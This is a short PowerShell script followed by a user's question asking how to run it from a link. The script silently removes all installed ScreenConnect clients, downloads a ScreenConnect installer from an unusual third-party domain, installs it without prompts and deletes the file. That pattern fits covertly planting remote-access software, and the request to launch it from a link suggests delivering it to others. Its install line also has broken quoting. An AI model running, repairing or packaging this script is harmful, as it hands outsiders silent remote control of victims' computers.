# Uninstall all ScreenConnect clients
Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*,
HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
Where-Object { $_.DisplayName -like "ScreenConnect Client*" } |
ForEach-Object {
    if ($_.UninstallString -match "{.*}") {
        $guid = $matches[0]
        Start-Process msiexec.exe -ArgumentList "/x $guid /qn /norestart" -Wait
    }
}

# Download your ScreenConnect agent
$url = "https://sm-sup.scpanelrkashopping.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$msi = "$env:TEMP\ScreenConnect.msi"

Invoke-WebRequest $url -OutFile $msi

# Install your ScreenConnect
Start-Process msiexec.exe -ArgumentList "/i "$msi" /qn /norestart" -Wait

Remove-Item $msi -Force
how can run this from link 
